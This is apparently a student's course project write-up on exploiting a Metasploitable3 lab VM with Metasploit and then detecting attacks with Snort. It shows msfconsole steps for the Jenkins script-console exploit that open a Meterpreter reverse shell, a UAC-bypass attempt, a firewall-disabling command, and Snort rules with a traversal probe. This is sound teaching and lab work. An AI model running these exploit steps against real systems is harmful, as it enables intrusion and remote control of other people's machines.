# cybersecuritybase-project-2

This is my take on Cybersecurity base MOOC project 2.

## The setup

Project was carried out with os x computer with metasploittable VM initialized via Vagrant. I modified the Vagrantfile provided slightly by exposing VM directly with known ip to host.

```
  config.vm.network "private_network", ip: "55.55.55.5"
```

This gave me the opportunity to install metasploit to my host machine and tinker with metasploittable "from the outside" - just as in a real life scenario. I knew it had a glassfish application server instance listening port 4848 and yes, I was able to access https://55.55.55.5:4848/ from my host machine.

### Installing metasploit framework

I installed metasploit framework with these instructions provided here https://null-byte.wonderhowto.com/how-to/mac-for-hackers-install-metasploit-framework-0174517/ and my goal is to learn how to use it from console, instead of provided web-ui. Installing metasploit seemed pretty easy and updating exploit registry can be simply done just by `msfupdate`.

## Initial port scan

First thing I learned is that metasploittable can be set to "easy" and "hard" and this effectively means disabling or enabling firewall. Firewall can be disabled easily by ssh'ing to machine `vagrant ssh` and running `netsh advfirewall set allprofiles state off`. I guess enlightened reader can figure out how to re-enable firewall again.

Next, I figured out how to run nmap from metasploit console.

**nmap with firewall enabled**
```
msf > db_nmap  55.55.55.5
[*] Nmap: Starting Nmap 6.47 ( http://nmap.org ) at 2017-03-16 16:24 EET
[*] Nmap: Nmap scan report for 55.55.55.5
[*] Nmap: Host is up (0.00083s latency).
[*] Nmap: Not shown: 991 filtered ports
[*] Nmap: PORT      STATE SERVICE
[*] Nmap: 21/tcp    open  ftp
[*] Nmap: 22/tcp    open  ssh
[*] Nmap: 80/tcp    open  http
[*] Nmap: 4848/tcp  open  appserv-http
[*] Nmap: 8022/tcp  open  oa-system
[*] Nmap: 8080/tcp  open  http-proxy
[*] Nmap: 9200/tcp  open  wap-wsp
[*] Nmap: 49153/tcp open  unknown
[*] Nmap: 49154/tcp open  unknown
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 5.61 seconds
```

**nmap with firewall disabled**
```
msf > db_nmap  55.55.55.5
[*] Nmap: Starting Nmap 6.47 ( http://nmap.org ) at 2017-03-16 16:23 EET
[*] Nmap: Nmap scan report for 55.55.55.5
[*] Nmap: Host is up (0.0021s latency).
[*] Nmap: Not shown: 977 closed ports
[*] Nmap: PORT      STATE SERVICE
[*] Nmap: 21/tcp    open  ftp
[*] Nmap: 22/tcp    open  ssh
[*] Nmap: 80/tcp    open  http
[*] Nmap: 135/tcp   open  msrpc
[*] Nmap: 139/tcp   open  netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds
[*] Nmap: 3306/tcp  open  mysql
[*] Nmap: 3389/tcp  open  ms-wbt-server
[*] Nmap: 4848/tcp  open  appserv-http
[*] Nmap: 7676/tcp  open  imqbrokerd
[*] Nmap: 8009/tcp  open  ajp13
[*] Nmap: 8022/tcp  open  oa-system
[*] Nmap: 8031/tcp  open  unknown
[*] Nmap: 8080/tcp  open  http-proxy
[*] Nmap: 8181/tcp  open  unknown
[*] Nmap: 8443/tcp  open  https-alt
[*] Nmap: 9200/tcp  open  wap-wsp
[*] Nmap: 49152/tcp open  unknown
[*] Nmap: 49153/tcp open  unknown
[*] Nmap: 49154/tcp open  unknown
[*] Nmap: 49157/tcp open  unknown
[*] Nmap: 49158/tcp open  unknown
[*] Nmap: 49159/tcp open  unknown
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 4.69 seconds
```
## First succesfull exploit

Here's brief instructions on how to use metasploit framework. At this time, snort was not installed, as I just wanted to first learn how to use metasploit.

```
fizzzzz: msfconsole 
                                                  
                                   ____________
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]
 [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]
 [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]
 [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]


       =[ metasploit v4.14.2-dev-437cba84b0563fb067757bb1ec03db9e01ed4579]
+ -- --=[ 1629 exploits - 929 auxiliary - 282 post        ]
+ -- --=[ 472 payloads - 39 encoders - 9 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > 
```

1. Select exploit
```
msf > use exploit/multi/http/jenkins_script_console 
msf exploit(jenkins_script_console) > 
```
2. Investigate exploit parameters
```
msf exploit(jenkins_script_console) > info

....

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  PASSWORD                    no        The password for the specified username
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOST                       yes       The target address
  RPORT      80               yes       The target port (TCP)
  SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
  SRVPORT    8080             yes       The local port to listen on.
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
  TARGETURI  /jenkins/        yes       The path to the Jenkins-CI application
  URIPATH                     no        The URI to use for this exploit (default is random)
  USERNAME                    no        The username to authenticate as
  VHOST                       no        HTTP server virtual host
...
```
3. Set exploit arguments
```
msf exploit(jenkins_script_console) > set RHOST 55.55.55.5
RHOST => 55.55.55.5
msf exploit(jenkins_script_console) > set RPORT 8484
RPORT => 8484
msf exploit(jenkins_script_console) > set TARGETURI /
TARGETURI => /
```
4. EXPLOIT!
```
msf exploit(jenkins_script_console) > exploit

[*] Started reverse TCP handler on 55.55.55.1:4444 
[*] Checking access to the script console
[*] No authentication required, skipping login...
[*] 55.55.55.5:8484 - Sending command stager...
[*] Command Stager progress -   2.06% done (2048/99626 bytes)
...
[*] Command Stager progress -  98.67% done (98304/99626 bytes)
[*] Sending stage (957487 bytes) to 55.55.55.5
[*] Command Stager progress - 100.00% done (99626/99626 bytes)
[*] Meterpreter session 1 opened (55.55.55.1:4444 -> 55.55.55.5:49602) at 2017-03-16 20:57:05 +0200

meterpreter > 
```

Meterpreter console is additional part of metasploit and it's intention is to be stealthy console in remote machine. In example meterpreter is opened to a remote machine (the metasploittable3 vm via 55.55.55.5:8484) and it's effectively a reverse shell. Comprehensive listing and additional info on meterpreter is available here: https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/

Now, because jenkins is not run with priviledged used we can't do anything really awesome directly (at least nothing that I'm aware of...).

Next step of using metasploitable is exploits that need session such as we have opened. We can run exploit that needs open session (usually reverse shell?) like this:
```
msf > use exploit/windows/local/bypassuac
msf exploit(bypassuac) > sessions

Active sessions
===============

  Id  Type                     Information                                   Connection
  --  ----                     -----------                                   ----------
  2   meterpreter x86/windows  NT AUTHORITY\LOCAL SERVICE @ METASPLOITABLE3  55.55.55.1:4444 -> 55.55.55.5:50400 (55.55.55.5)

msf exploit(bypassuac) > set SESSION 2
SESSION => 2
msf exploit(bypassuac) > exploit

[*] Started reverse TCP handler on 192.168.0.11:4444 
[-] Exploit aborted due to failure: no-access: Not in admins group, cannot escalate with this module
[*] Exploit completed, but no session was created.
```

Eventhough omitted in msfconsole listing, one can query for `info` of exploit and it tells pretty clearly that one must set session to this exploit. It's just a parameter to exploit. This exploit did not work with jenkins sec hole because it needs more priviledged access.

Additional important commands include but are not limited to: `back` (unsets current exploit), `edit` (edits exploit's code, usable for checking out what exploit actually does).

## Installing snort to metasploittable

First, I downloaded the Snort package from snort.org and installed it to metasploittable3. Installer notified that I also need a packet capturer called winpcap so I downloaded it from winpcap.org and installed it straight up.

After some initial reading on snort manual (http://manual-snort-org.s3-website-us-east-1.amazonaws.com/), I started snort in sniffer mode with `snort.exe -v`, and indeed, when I sent some http request from host to metasploittable I did see packets printed on the console. And when running with `snort.exe -vd` or even `snort.exe -vde` even more information was exposed of the packets processed. Nice. Back to more reading.

At this stage, I saw lots of `WARNING: No preprocessors configured for policy 0.` messages. Quick googling revealed that this means that snort configuration is not initialised.

After hours of horrible windows tinkering (I'm a total craphand with windows) I realised, I could just install Snort to host and set it to listen to my virtualbox interface. Still, configuring snort is not an easy task, but I managed to get it running like this.

``` 
brew install snort
brew install pulledpork
```

Then I added my oinkcode to `/usr/local/etc/pulledpork/pulledpork.conf`, set `rule_path=/usr/local/etc/snort/rules/snort.rules`, commented `out_path` out, set `local_rules=/usr/local/etc/snort/rules/local.rules`. I touched all those rule files including `/usr/local/etc/snort/sid-msg.map`. After this I ran:

```
pulledpork.pl -c pulledpork.conf -w -P
```

And from the snort.conf I commented out all the rule file references and added only:

```
include $RULE_PATH/local.rules
include $RULE_PATH/snort.rules
```

Snort was run in this experiment with:

```
snort -i vboxnet2 -A console -c snort.conf -l ~/snort-logs/
```

How to ensure that snort actually works? I created following to local.rules

```
alert icmp any any -> any any (msg: "ICMP Packet found";)
```

And indeed, i received alerts when `ping 55.55.55.5`. Yay!

But the next step was to find if it reacts to actual proper rule or exploit. I managed to exploit metasploittable3 with MULTIPLE metasploit modules without detecting them at all! But the I just realised that I should do someting like this:

```
# See all the active rules, and try to find something easily understandable
grep -v "#" ../snort/rules/snort.rules 
...
alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"SERVER-WEBAPP WordPress wp-config.php access via directory traversal attempt"; flow:to_server,established; content:"/wp-content/"; nocase; http_uri; content:"/wp-config.php"; fast_pattern:only; http_uri; content:"../"; http_uri; metadata:policy balanced-ips drop, policy security-ips drop, service http; reference:bugtraq,69497; classtype:web-application-attack; sid:41420; rev:1;)
...

Maybe it'l match to something like this?
curl "55.55.55.5/wp-content/wp-config.php?foo=../"

AND INDEED! An alert was triggered. Yay yay ya!
03/25-15:16:37.119858  [**] [1:41420:1] SERVER-WEBAPP WordPress wp-config.php access via directory traversal attempt [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 55.55.55.1:53409 -> 55.55.55.5:80
```
